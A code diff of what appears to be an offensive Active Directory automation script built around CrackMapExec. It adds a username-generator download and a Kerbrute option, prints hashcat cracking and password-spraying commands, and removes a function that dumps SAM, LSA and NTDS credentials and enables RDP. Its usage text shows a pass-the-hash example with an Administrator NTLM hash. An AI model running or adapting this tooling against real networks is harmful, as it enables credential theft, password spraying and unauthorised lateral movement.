@@ -30,6 +30,8 @@ def install_packages(args):
     subprocess.run(['sudo', 'apt', 'install', 'crackmapexec', '-y'])
     subprocess.run(['sudo', 'apt', 'install', 'ntpdate', '-y'])
     subprocess.run(['sudo', 'apt', 'install', 'python3-impacket', '-y'])
+    subprocess.run(['wget', 'https://raw.githubusercontent.com/urbanadventurer/username-anarchy/master/format-plugins.rb'])
+    subprocess.run(['wget', 'https://raw.githubusercontent.com/urbanadventurer/username-anarchy/master/username-anarchy'])
     print(f"Running Installation: {args.install}")
     print("Installing necessary packages...")
 
@@ -82,7 +84,7 @@ def find_ntlm_hashes(output):
     # Check if any NTLM hash segments were found
     if ntlm_hash_segments:
         print("\033[93m\033[1mAlert: Found NTLM hash segments! They will be saved.\033[0m\033[0m")
-        print("\033[93m\033[1mAlert: To crack: hashcat.exe -m 1000 -a 3 hashes.txt rockyou.txt -o cracked.txt.\033[0m\033[0m")
+        print("\033[93m\033[1mTo crack: hashcat.exe -m 1000 -a 3 hashes.txt rockyou.txt -o cracked.txt.\033[0m\033[0m")
     
         if ntlm_hash_segments:
             print("\033[93m\033[1mAlert: Found NTLM hash segments! They will be saved.\033[0m\033[0m")
@@ -109,8 +111,8 @@ def check_users(output, ip_address):
     # Print the alert if any usernames were found
     if usernames:
         print("\033[93m\033[1mAlert: Found usernames! They will be saved as users.txt.\033[0m\033[0m")
-        print("\033[93m\033[1mAlert: crackmapexec smb IP -u users.txt -p password.txt\033[0m\033[0m")
-        print("\033[93m\033[1mAlert: sudo python3 ADautomator.py --adnuke -u users.txt -p PASSWORD\033[0m\033[0m")
+        print("\033[93m\033[1mUSAGE: crackmapexec smb IP -u users.txt -p password.txt\033[0m\033[0m")
+        print("\033[93m\033[1mUSAGE: sudo python3 ADautomator.py --adnuke -u users.txt -p PASSWORD\033[0m\033[0m")
         
 
 # Code to check if the IP address is pwned
@@ -136,45 +138,6 @@ def check_rdp_status(output, ip_address):
         #Print the alert with the IP address in red
         print(f"\033[93m\033[1mAlert: RDP IS NOW ENABLED {ip_address}.\033[0m\033[0m")
 
-
-# Code to run domainenum which is CrackMapExec with just non invasive flags set
-def run_domainenum(ip_address, username, password, args):
-    flag_checks = {
-    '': check_pwned,
-    '': check_lockout_policy,
-    '--pass-pol': check_lockout_policy,
-    '--users': check_pwned,
-    '--users': check_users,
-    '--shares': check_pwned,
-    '--sam': check_pwned,
-    '--lsa': check_pwned,
-    '--ntds': check_pwned,
-    '--ntds vss': check_pwned,
-    '--ntds-history': check_pwned,
-    '-M' 'rdp' '-o' 'ACTION=enable': check_rdp_status,
-    }
-
-    # List of smb flags and modules to loop through
-    smbflags = ['', '--pass-pol', '--users', '--shares', '--sessions', '--sam', '--lsa', 
-                '--ntds',]
-
-    # List to store all found hash segments
-    all_ntlm_hash_segments = []
-    
-    # Loop through all smb flags and modules
-    for smbflag in smbflags:
-        print(f"Processing flag: {smbflag}")
-        command = ['crackmapexec', 'smb', ip_address]
-        if username:
-            command.extend(['-u', username])
-        if password:
-            command.extend(['-p', password])
-        if smbflag:
-            command.append(smbflag)
-        
-        print(f"Running CrackMapExec on IP: {ip_address} with flag: {smbflag}")
-        result = subprocess.run(command, capture_output=True, text=True)
-        print(result.stdout)
 
 # Code to run ADNuke which is CrackMapExec with all smb and ldap flags set
 def run_adnuke(ip_address, username, password, args):
@@ -325,12 +288,6 @@ def main(args):
         print(f"Running Installation: {args.install}")
         install_packages(args) # Call the function to install packages
     
-    # Code to handle domain enumeration
-    if args.domainenum:
-        # Code to handle domain enumeration
-        print(f"Running Domain Enumeration: {args.domainenum}")
-        #run_domainenum(args.ipaddress, args.username, args.password)
-
     if args.output:
         # Code to handle output
         print(f"Running Output: {args.output}")
@@ -341,6 +298,11 @@ def main(args):
         # Code to handle ADNuke        
         print(f"Running ADNuke with options: {args.adnuke}")
         run_adnuke(args.ipaddress, args.username, args.password, args)    
+
+    if args.kerbrute:
+        # Code to handle Kerbrute
+        print(f"Running Kerbrute with options: {args.kerbrute}")
+        #run_kerbrute(args.ipaddress, args.username, args.password)
 
     # MAKE SURE TO KEEP THIS LAST - Reset stdout to its original value
     if args.output:
@@ -355,9 +317,7 @@ if __name__ == "__main__":
     "  ADautomator.py --install\n"  
     "  ADautomator.py --adnuke -ip 192.168.56.0/24\n"
     "  ADautomator.py --adnuke -ip 192.168.56.0/24 -u username -p password -out output.txt\n"
-    "  ADautomator.py --adnuke -ip targets.txt -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4 -out testout.txt\n"
-    "  ADautomator.py --domainenum -ip targets.txt -u username -p password -out output.txt\n"
-    "  ADautomator.py --domainenum -ip targets.txt -out testout.txt\n",
+    "  ADautomator.py --adnuke -ip targets.txt -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4 -out testout.txt\n",
     formatter_class=argparse.RawTextHelpFormatter)
 
     parser.add_argument('-d', '--domain', help='Domain name'), 
@@ -368,17 +328,13 @@ if __name__ == "__main__":
     parser.add_argument('-p', '--password', help='Password for any tool', default='')
     parser.add_argument('-H', '--hash', help='Hash for any tool', default='')
     parser.add_argument("--adnuke", help="Run CrackMapExec with DC IP, username, password and all smb and ldap flags set", action='store_true')
-    parser.add_argument("--domainenum", help="Run ALL CrackMapExec Modules and Flags set", action='store_true')
+    parser.add_argument("--kerbrute", help="Run Kerbrute with specified options", nargs='*', type=str)
     args = parser.parse_args()
     
-    if not any([args.adnuke, args.domainenum, args.install]):
-        parser.error("You must use one of the following --adnuke, --domainenum, or --install")
+    if not any([args.adnuke, args.install]):
+        parser.error("You must use one of the following --adnuke or --install")
     
     if args.adnuke and not args.ipaddress:
         parser.error("--adnuke requires --ip to be specified")
     
-    if args.domainenum and not args.ipaddress:
-        parser.error("--domainenum requires --ip to be specified")
-
-
     main(args)
